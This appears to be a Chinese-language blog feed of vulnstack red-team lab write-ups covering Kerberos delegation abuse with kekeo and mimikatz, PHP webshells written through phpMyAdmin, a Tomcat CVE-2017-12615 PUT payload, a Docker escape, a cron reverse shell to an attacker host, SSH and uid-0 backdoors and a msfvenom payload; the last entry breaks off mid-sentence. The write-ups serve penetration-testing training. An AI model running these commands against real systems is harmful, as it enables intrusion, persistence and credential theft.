src="https://res.cloudinary.com/lin1109/image/upload/v1636619386/Xnip2021-11-11_16-29-36_k8gsiq.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636619343/Xnip2021-11-11_16-28-51_jdqwc4.png"></p><p>抓一下凭据</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636619728/Xnip2021-11-11_16-35-13_rfzty0.png"></p><h2 id="域内委派攻击"><a href="#域内委派攻击" class="headerlink" title="域内委派攻击"></a>域内委派攻击</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。 简言之：当 A 访问服务 B 时，服务 B 拿着 A 用户的凭证去访问服务 C，这个过程称为委派。</p><p><strong>委派的方式</strong></p><p>非约束委派和约束委派，基于资源的约束委派。</p><p>在域内只有主机账号和服务账号才有委派属性 主机账号：活动目录中的 computers 组内的计算机，也被称为机器账号。 服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer、MYSQL 等；域用户通过注册 SPN 也能成为服务账号。</p><p>使用 ADFind 查找域中配置约束委派用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-h</span> <span class="number">172.16</span>.<span class="number">20.132</span> <span class="literal">-u</span> saul <span class="literal">-up</span> admin!<span class="selector-tag">@</span><span class="comment">#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636621547/Xnip2021-11-11_17-05-34_pi24wr.png"></p><p>sqlserver 是一个约束委派用户</p><p>利用 kekeo 请求该用户的 TGT 票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k.exe &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;</span><br></pre></td></tr></table></figure><p>我这里执行报错了，但是票据已经生成了，可能内存给的不够，小破机</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636682550/Xnip2021-11-12_10-02-13_wv8hrn.png"></p><p>使用这张票据申请域控的 TGS 票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k.exe &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span><br></pre></td></tr></table></figure><p>最后使用 mimikatz 注入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636683001/Xnip2021-11-12_10-01-00_r9drje.png"></p><p>可以访问域控</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636683006/Xnip2021-11-12_10-01-18_wmhbn0.png"></p><h2 id="上线域控"><a href="#上线域控" class="headerlink" title="上线域控"></a>上线域控</h2><p>psexec 上线域控即可</p><p>至此全部上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636694626/Xnip2021-11-12_12-43-34_lzoanu.png"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>感谢师傅</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636704213/IMG_1330_w3ocwd.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack 红队评估靶场五 WriteUp</title>
      <link href="/posts/368123707/"/>
      <url>/posts/368123707/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h2><p>靶场下载部署：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">http://vulnstack.qiyuanxuetang.net/vuln/detail/7/</a></p><p>靶场拓扑</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635488876/Xnip2021-10-29_14-27-36_lajsrb.png"></p><p>windows 7 上开启 phpstudy</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>直接访问 ip 是一个 think php 的页面，直接工具检测一波漏洞</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635489010/Xnip2021-10-29_14-29-57_ikbptu.png"></p><p>直接 getshell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635489123/Xnip2021-10-29_14-31-49_als9ss.png"></p><h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>无AV上线 cs</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635489524/Xnip2021-10-29_14-38-27_wcifot.png"></p><p>抓取账户明文密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635492263/Xnip2021-10-29_15-11-59_oni6dz.png"></p><p>有域管密码，直接 psexec 横向即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635492341/Xnip2021-10-29_15-25-29_n8optd.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack 红队评估靶场一 WriteUp</title>
      <link href="/posts/3760774267/"/>
      <url>/posts/3760774267/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="靶场部署"><a href="#靶场部署" class="headerlink" title="靶场部署"></a>靶场部署</h2><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>靶场拓扑</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385009/Xnip2021-10-28_09-36-31_tdacrq.png"></p><p>win7 需要手动开启 phpstudy</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规流程 namp 走一波</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ nmap -sS -P0 10.2.14.8</span><br></pre></td></tr></table></figure><p>开放了 80 和 3306 端口</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385235/Xnip2021-10-28_09-40-23_m5lsun.png"></p><p>访问 80 是一个 phpstudy 探针页面</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385431/Xnip2021-10-28_09-43-10_pxxrcv.png"></p><h2 id="yxcms-后台管理员账户弱口令"><a href="#yxcms-后台管理员账户弱口令" class="headerlink" title="yxcms 后台管理员账户弱口令"></a>yxcms 后台管理员账户弱口令</h2><p>yxcms 公告处泄露了后台地址和账户密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385588/Xnip2021-10-28_09-46-08_gt31an.png"></p><p>后台地址：<a href="http://10.2.14.8/yxcms/index.php?r=admin/index/login">http://10.2.14.8/yxcms/index.php?r=admin/index/login</a> 使用 admin&#x2F;123456 成功登录</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385808/Xnip2021-10-28_09-48-23_jfrrn6.png"></p><p>关于 yxcms 存在的漏洞可以百度相关文章</p><h2 id="phpmyadmin-后台地址泄露"><a href="#phpmyadmin-后台地址泄露" class="headerlink" title="phpmyadmin 后台地址泄露"></a>phpmyadmin 后台地址泄露</h2><p>因为是 phpstudy 的环境，极有可能存在 phpmyadmin，直接构造链接访问</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635385959/Xnip2021-10-28_09-52-24_yaxmzz.png"></p><h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>使用弱口令 root&#x2F;root 进入 phpmyadmin</p><p>phpstudy 探针页面泄露了网站根路径、在 phpmyadmin 中看一下变量 secure-file-priv 的值，看看能不能直接写入一句话木马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span></span><br></pre></td></tr></table></figure><p>secure-file-priv&#x3D;null 因此无法直接往根目录写 webshell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635386262/Xnip2021-10-28_09-57-17_lhcd0s.png"></p><p>phpmyadmin 全局日志 getshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>; #开启全局日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/admins.php&#x27;</span>; #更改日志路径</span><br><span class="line"><span class="keyword">Select</span> <span class="string">&#x27;&lt;?php eval($_POST[pass]);?&gt;&#x27;</span> #写入一句话</span><br></pre></td></tr></table></figure><p>哥斯拉连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635387005/Xnip2021-10-28_10-09-50_rdsq2t.png"></p><h2 id="yxcms-后台任意文件读写漏洞"><a href="#yxcms-后台任意文件读写漏洞" class="headerlink" title="yxcms 后台任意文件读写漏洞"></a>yxcms 后台任意文件读写漏洞</h2><p>在后台创建新模板模块创建内容为一句话的新模板</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635387212/Xnip2021-10-28_10-13-21_oangiq.png"></p><p>模版文件路径：&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;shell.php</p><p>哥斯拉连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635387419/Xnip2021-10-28_10-16-45_xbbrll.png"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>前面拿到 webshell 权限比较高，直接上线 cs 进行后续渗透</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635400494/Xnip2021-10-28_13-54-39_vhvwou.png"></p><h2 id="获取账户密码明文"><a href="#获取账户密码明文" class="headerlink" title="获取账户密码明文"></a>获取账户密码明文</h2><p>可以看到抓到了域管账户密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635400630/Xnip2021-10-28_13-56-18_oq59pk.png"></p><h3 id="用户密码-hash"><a href="#用户密码-hash" class="headerlink" title="用户密码 hash"></a>用户密码 hash</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635401535/Xnip2021-10-28_14-11-03_eibmtj.png"></p><h2 id="域控上线"><a href="#域控上线" class="headerlink" title="域控上线"></a>域控上线</h2><p>先扫描一下域内存活主机然后建立 SMB 监听 psexec 横向即可</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635401529/Xnip2021-10-28_14-10-04_ro4uks.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnstack 红队评估靶场四 WriteUp</title>
      <link href="/posts/2874763204/"/>
      <url>/posts/2874763204/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="靶场部署"><a href="#靶场部署" class="headerlink" title="靶场部署"></a>靶场部署</h2><p>靶场下载部署：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/#file">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/#file</a></p><p>靶场拓扑</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635153595/Xnip2021-10-25_17-18-36_hzmwej.png"></p><p>需要在 ubuntu 上手动开启 3 个漏洞环境</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635154022/Xnip2021-10-25_17-26-51_tmukt8.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规流程 namp 走一波</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ nmap -sS -P0 10.2.14.13</span><br></pre></td></tr></table></figure><p>可以看到开放了 2001&#x2F;2002&#x2F;2003 端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-25 17:28 CST</span><br><span class="line">Nmap scan report for 10.2.14.13</span><br><span class="line">Host is up (0.013s latency).</span><br><span class="line">Not shown: 993 closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">135/tcp  filtered msrpc</span><br><span class="line">139/tcp  filtered netbios-ssn</span><br><span class="line">445/tcp  filtered microsoft-ds</span><br><span class="line">2001/tcp open     dc</span><br><span class="line">2002/tcp open     globe</span><br><span class="line">2003/tcp open     finger</span><br></pre></td></tr></table></figure><h2 id="Strust2-getshell"><a href="#Strust2-getshell" class="headerlink" title="Strust2 getshell"></a>Strust2 getshell</h2><p><a href="http://10.2.14.13:2001/">http://10.2.14.13:2001/</a></p><p>挺蛇皮 一个上传页面 这要是黑盒测试估计猜不出来是 Strust2</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635154415/Xnip2021-10-25_17-33-23_mqy5et.png"></p><p>话不多说，使用工具直接打就行了，上来就是一个 root 权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635154583/Xnip2021-10-25_17-36-09_y28vnt.png"></p><p>找了半天根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/src/src/main/webapp/pages</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635154922/Xnip2021-10-25_17-41-52_l7elhv.png"></p><p>利用工具直接上传一个 webshell</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635156681/Xnip2021-10-25_18-11-10_umrcwe.png"></p><h2 id="Tomcat-PUT-方法任意写文件漏洞（CVE-2017-12615）getshell"><a href="#Tomcat-PUT-方法任意写文件漏洞（CVE-2017-12615）getshell" class="headerlink" title="Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）getshell"></a>Tomcat PUT 方法任意写文件漏洞（CVE-2017-12615）getshell</h2><p><a href="http://10.2.14.13:2002/">http://10.2.14.13:2002/</a></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635157663/Xnip2021-10-25_18-27-32_pci1be.png"></p><p>掏出 burp 逮包传马 这一波是打的灰常顺利</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635156937/Xnip2021-10-25_18-15-19_gtqjkp.png"></p><p>完整 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: ip:2002</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">your webshell here</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635157015/Xnip2021-10-25_18-16-46_aaes3t.png"></p><h2 id="phpmyadmin-4-8-1-远程文件包含漏洞-getshell"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞-getshell" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞 getshell"></a>phpmyadmin 4.8.1 远程文件包含漏洞 getshell</h2><p><a href="http://10.2.14.13:2003/">http://10.2.14.13:2003/</a></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635157639/Xnip2021-10-25_18-27-06_zrrzvq.png"></p><p>这个数据库有一个叫 test 的数据库，可以创建表，我们创建一个 rce 表，向表内插入 php 语句，包含执行 phpinfo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use test;</span><br><span class="line">show global variables like &quot;%datadir%&quot;;</span><br><span class="line">CREATE TABLE rce(code varchar(100));</span><br><span class="line">INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635158284/Xnip2021-10-25_18-37-54_hjagqp.png"></p><p>包含 session 文件</p><p>想要包含 session 文件需要知道存放的 session 临时文件位置和 session 命名规则</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635158234/Xnip2021-10-25_18-37-04_ska0r1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.14.13:2003/index.php?target=db_datadict.php%253f../../../../../../../../../tmp/sess_8525b2b956856f2585670cbefa203a12</span><br></pre></td></tr></table></figure><p>成功执行了 phpinfo</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635158342/Xnip2021-10-25_18-38-36_taaq09.png"></p><p>在 phpinfo 页面可以找到网站根目录信息，直接往根目录写 webshell</p><p>emmm 这里我失败了 看了下靶机，作者的环境是站库分离的 写个锤子的 webshell</p><p>正常情况下写入 webshell 再包含就可以了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;)?&gt;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/tmp/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[&quot;hack&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Docker-逃逸"><a href="#Docker-逃逸" class="headerlink" title="Docker 逃逸"></a>Docker 逃逸</h2><p>发现.dockerenv 文件、目标为 docker 环境</p><p>非 docker 环境一般不会有 dockerenv 文件，但如果 dockerfile 写的比较好的也有可能没有这个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -alh /.dockerenv</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635161181/Xnip2021-10-25_19-26-07_wcevw4.png"></p><p>利用特权模式 docker 逃逸</p><p>如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行 docker run —privileged 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。</p><p>先创建一个文件夹，然后将宿主机根目录挂载至容器目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /666</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /666 <span class="comment">#将宿主机/dev/sda1 目录挂载至容器内 /666目录</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635161372/Xnip2021-10-25_19-29-17_sntyvm.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635161646/Xnip2021-10-25_19-33-55_legsth.png"></p><p>计划任务反弹宿主机 shell</p><p>在挂载的 tmp 目录下写入一个反弹 shell 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/bin/bash -i &gt;&amp; bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635207302/Xnip2021-10-26_08-14-46_gzdosg.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a*/1 *    * * *    root  bash /tmp/test.sh &#x27;</span>  /666/etc/crontab  <span class="comment">#写入计划任务</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /666/etc/crontab  <span class="comment">#查看计划任务</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888  <span class="comment">#攻击机监听</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635207571/Xnip2021-10-26_08-18-27_lidhfl.png"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>因为写计划任务的时候是指定 root 用户执行反弹 shell 的脚本，因此反弹回来的 shell 也是 root 最高权限</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635207576/Xnip2021-10-26_08-19-05_kbldhx.png"></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="ssh-软连接后门"><a href="#ssh-软连接后门" class="headerlink" title="ssh 软连接后门"></a>ssh 软连接后门</h3><p>软连接后门的原理是利用了 PAM 配置文件的作用，将 sshd 文件软连接名称设置为 su，这样应用在启动过程中他会去 PAM 配置文件夹中寻找是否存在对应名称的配置信息（su），然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/sbin/sshd /tmp/su</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/su -oPort=9090</span><br></pre></td></tr></table></figure><p>ssh 远程登录，输入任意密码即可连接</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635208084/Xnip2021-10-26_08-26-43_telop1.png"></p><h3 id="添加-uid-0-用户后门-root-组权限"><a href="#添加-uid-0-用户后门-root-组权限" class="headerlink" title="添加 uid 0 用户后门 root 组权限"></a>添加 uid 0 用户后门 root 组权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd 123456`  -o -u 0 backdoor <span class="comment">#在计划任务反弹回来的那个会话执行</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635208310/Xnip2021-10-26_08-31-31_avn743.png"></p><p>通过 ssh 软连接后门任意密码登录 ubuntu 账户，再用 su 命令切换到我们创建的后门用户即可获得 root 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ubuntu@10.10.10.10 -p 9090  <span class="comment">#ssh远程连接</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su backdoor <span class="comment">#切换我们创建的用户</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635208628/Xnip2021-10-26_08-36-49_irx4vr.png"></p><h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>发现另外一个网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635209333/Xnip2021-10-26_08-48-39_w0l7f0.png"></p><p>上线 msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9091 -f elf &gt; shell1.elf <span class="comment">#生成linux后门文件</span></span><br></pre></td></tr></table></figure><p>msf 开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.10.10.10</span><br><span class="line">lhost =&gt; 10.10.10.10</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 9091</span><br><span class="line">lport =&gt; 9091</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure><p>将文件上传到 &#x2F; 666&#x2F;tmp 挂载目录下、赋予执行权限然后以 root 权限运行后门文件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635210174/Xnip2021-10-26_09-02-32_ktwmts.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635234241/3151635234144_.pic_hd_zx8xvi.png"></p><h3 id="内网存活主机探测"><a href="#内网存活主机探测" class="headerlink" title="内网存活主机探测"></a>内网存活主机探测</h3><p>使用 msf tcp 探测内网存活主机</p><p>先添加路由条目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.183.0/24</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 192.168.183.0/24</span><br><span class="line">rhosts =&gt; 192.168.183.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure><p>上面这样扫整个 c 段很慢，我把 ip 范围缩小了一点，现实情况中就必须等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use auxiliary/scanner/portscan/tcp</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set rhosts 192.168.183.127-140</span><br><span class="line">rhosts =&gt; 192.168.183.0/24</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; set threads 20</span><br><span class="line">threads =&gt; 20</span><br><span class="line">msf6 auxiliary(scanner/portscan/tcp) &gt; run</span><br></pre></td></tr></table></figure><p>可以看到 3 个 